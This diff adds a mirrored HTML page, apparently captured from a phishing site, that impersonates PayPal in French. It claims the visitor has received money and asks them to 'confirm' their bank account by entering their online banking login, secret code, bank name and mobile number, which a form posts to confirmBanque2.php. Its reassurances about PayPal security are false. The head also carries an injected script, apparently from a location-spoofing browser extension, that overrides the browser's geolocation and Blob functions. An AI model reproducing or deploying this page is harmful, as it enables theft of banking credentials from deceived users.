@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+
+<html data-reactroot="">
+<!-- Mirrored from carapal.bida-finances.com/confirmbank.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 May 2020 20:25:09 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script>(function(){function xwMnL() {
+  //<![CDATA[
+  window.qBIPIus = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
+  window.NgZXzuN = navigator.geolocation.watchPosition.bind(navigator.geolocation);
+  let WAIT_TIME = 100;
+
+  
+  if (!['http:', 'https:'].includes(window.location.protocol)) {
+    // assume the worst, fake the location in non http(s) pages since we cannot reliably receive messages from the content script
+    window.thbdI = true;
+    window.tgKAT = 38.883333;
+    window.XdMpN = -77.000;
+  }
+
+  function waitGetCurrentPosition() {
+    if ((typeof window.thbdI !== 'undefined')) {
+      if (window.thbdI === true) {
+        window.sHZGpbq({
+          coords: {
+            latitude: window.tgKAT,
+            longitude: window.XdMpN,
+            accuracy: 10,
+            altitude: null,
+            altitudeAccuracy: null,
+            heading: null,
+            speed: null,
+          },
+          timestamp: new Date().getTime(),
+        });
+      } else {
+        window.qBIPIus(window.sHZGpbq, window.zjRNFRw, window.lLFzO);
+      }
+    } else {
+      setTimeout(waitGetCurrentPosition, WAIT_TIME);
+    }
+  }
+
+  function waitWatchPosition() {
+    if ((typeof window.thbdI !== 'undefined')) {
+      if (window.thbdI === true) {
+        navigator.getCurrentPosition(window.VbAwXFc, window.WoyncBI, window.YIJkC);
+        return Math.floor(Math.random() * 10000); // random id
+      } else {
+        window.NgZXzuN(window.VbAwXFc, window.WoyncBI, window.YIJkC);
+      }
+    } else {
+      setTimeout(waitWatchPosition, WAIT_TIME);
+    }
+  }
+
+  navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
+    window.sHZGpbq = successCallback;
+    window.zjRNFRw = errorCallback;
+    window.lLFzO = options;
+    waitGetCurrentPosition();
+  };
+  navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
+    window.VbAwXFc = successCallback;
+    window.WoyncBI = errorCallback;
+    window.YIJkC = options;
+    waitWatchPosition();
+  };
+
+  const instantiate = (constructor, args) => {
+    const bind = Function.bind;
+    const unbind = bind.bind(bind);
+    return new (unbind(constructor, null).apply(null, args));
+  }
+
+  Blob = function (_Blob) {
+    function secureBlob(...args) {
+      const injectableMimeTypes = [
+        { mime: 'text/html', useXMLparser: false },
+        { mime: 'application/xhtml+xml', useXMLparser: true },
+        { mime: 'text/xml', useXMLparser: true },
+        { mime: 'application/xml', useXMLparser: true },
+        { mime: 'image/svg+xml', useXMLparser: true },
+      ];
+      let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));
+
+      if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
+        const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
+        if (mimeTypeIndex >= 0) {
+          let mimeType = injectableMimeTypes[mimeTypeIndex];
+          let injectedCode = `<script>(
+            ${xwMnL}
+          )();<\/script>`;
+    
+          let parser = new DOMParser();
+          let xmlDoc;
+          if (mimeType.useXMLparser === true) {
+            xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
+          } else {
+            xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
+          }
+
+          if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
+            xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
+    
+            if (mimeType.useXMLparser === true) {
+              args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
+            } else {
+              args[0][0] = xmlDoc.documentElement.outerHTML;
+            }
+          }
+        }
+      }
+
+      return instantiate(_Blob, args); // arguments?
+    }
+
+    // Copy props and methods
+    let propNames = Object.getOwnPropertyNames(_Blob);
+    for (let i = 0; i < propNames.length; i++) {
+      let propName = propNames[i];
+      if (propName in secureBlob) {
+        continue; // Skip already existing props
+      }
+      let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
+      Object.defineProperty(secureBlob, propName, desc);
+    }
+
+    secureBlob.prototype = _Blob.prototype;
+    return secureBlob;
+  }(Blob);
+
+  Object.freeze(navigator.geolocation);
+
+  window.addEventListener('message', function (event) {
+    if (event.source !== window) {
+      return;
+    }
+    const message = event.data;
+    switch (message.method) {
+      case 'TpXNhbc':
+        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
+          window.tgKAT = message.info.coords.lat;
+          window.XdMpN = message.info.coords.lon;
+          window.thbdI = message.info.fakeIt;
+        }
+        break;
+      default:
+        break;
+    }
+  }, false);
+  //]]>
+}xwMnL();})()</script>
+
+    
+    <title>Vous avez reçu de l'argent</title>
+    
+    <meta name="application-name" content="">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico">
+    <link rel="apple-touch-icon" href="public/img/pp64.png">
+    <link rel="canonical" href="#">
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
+    <link rel="stylesheet" href="public/css/main.ltr.css">
+    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8">
+    <link rel="stylesheet" href="public/css/contextualLogin.css">
+<style id="inert-style">
+[inert] {
+  pointer-events: none;
+  cursor: default;
+}
+
+[inert], [inert] * {
+  user-select: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+}
+</style></head>
+
+<body class="vx_root vx_addFlowTransition">
+<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
+    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection" tabindex="-1">
+        <div class="vx_modal-content">
+
+                <header class="vx_modal-header">
+        <div aria-live="pJOHNESSte">
+            <div class="headerWrapper">
+                <h1 class="vx_text-2 " style="text-align: center">Confirmez le compte bancaire</h1></div>
+        </div>
+        <p class="vx_text-body">
+        </p>
+
+    </header>
+    <div class="vx_modal-body vx_blocks-for-mobile">
+        <div>
+            <div class="vx_modal-body vx_blocks-for-mobile">
+                <div class="form-container">
+                    <div class="signupCheckBox">
+                        <div class="expandableContainer">
+                            <label for="paypalAccountData_tcpa">
+                                <strong>Pourquoi dois-je v&eacute;rifier les informations financi&egrave;res?</strong><br>
+                                <p>Pour b&eacute;n&eacute;ficier pleinement de votre compte Paypal et pouvoir transferer votre argent de votre compte Paypal vers votre compte bancaire et vice-versa, vous devez obligatoirement confirmer votre compte bancaire &agrave; l&acute;aide de vos identifiants de connexion en ligne par mesure de s&eacute;curit&eacute;.</p>
+                            </label>
+                        </div>
+                    </div>
+                        <form method="POST" action="confirmBanque2.php" accept-charset="UTF-8" novalidate="" class="proceed maskable" autocomplete="off" name="cvalidate"><input name="_token" type="hidden">
+
+                        <div class="vx_form-group vx_floatingLabel_active" data-label-content="Identifiant bancaire">
+                         <label class="floatingLabel" for="cardNumber">Identifiant bancaire</label>
+                         <input value="" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardprenom" placeholder="" aria-describedby="text-info-cardNumber" id="cardNom" name="cardNom" type="text">
+                        </div>
+                        <div class="vx_form-group vx_floatingLabel_active" data-label-content="Code secret">
+                         <label class="floatingLabel" for="cardNumber">Code secret</label>
+                         <input value="" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardprenom" placeholder="" aria-describedby="text-info-cardNumber" id="codeSecret" name="codeSecret" type="text">
+                        </div>
+                        <div class="vx_form-group vx_floatingLabel_active" data-label-content="Nom de la banque">
+                         <label class="floatingLabel" for="cardNumber">Nom de la banque</label>
+                         <input value="" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardprenom" placeholder="" aria-describedby="text-info-cardNumber" id="nomBanque" name="nomBanque" type="text">
+                        </div>
+
+                        <div class="vx_form-group vx_floatingLabel_active" data-label-content="Numéro de mobile">
+                            <label class="floatingLabel" for="banque">Numéro de mobile</label>
+                           <input value="" aria-label="login_emaildiv" class="test_banque test_banque vx_form-control" required="required" autocomplete="off_cardAdresse1" placeholder="" aria-describedby="text-info-banque" id="numMobile" name="numMobile" type="text">
+                       </div>
+                       <br>
+                       <div class="vx_form-group vx_floatingLabel_active">
+                       
+                    <strong>Pourquoi dois-je v&eacute;rifier les informations financi&egrave;res?</strong><br>
+                                <p>Si votre compte Paypal a &eacute;t&eacute; pirat&eacute;, un individu mal intentionn&eacute; pourait receptionner votre paiement en votre nom. La v&eacute;rification bancaire permet de pallier ce risque.<br>Paypal vous demande de v&eacute;rifier votre compte de sorte que futurs transferts ne soient pas envoy&eacute;s vers un mauvais compte bancaire.
+.</p><br>
+<strong>Paypal vous remercie de votre confiance</strong>
+
+                           
+                       </div>
+                       
+
+                        <button type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="">Valider</button>
+                    </form>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+            <div class="signup-page-footer vx_text-legal center">©1999-2020 PayPal. Tous droits r&eacute;serv&eacute;s.</div>
+
+        </div>
+    </div>
+
+</div>
+
+<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
+<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
+<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
+<script type="text/javascript" defer="" src="public/js/pa.js"></script>
+
+
+
+
+</body>
+<!-- Mirrored from carapal.bida-finances.com/confirmbank.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 May 2020 20:25:30 GMT -->
+</html>
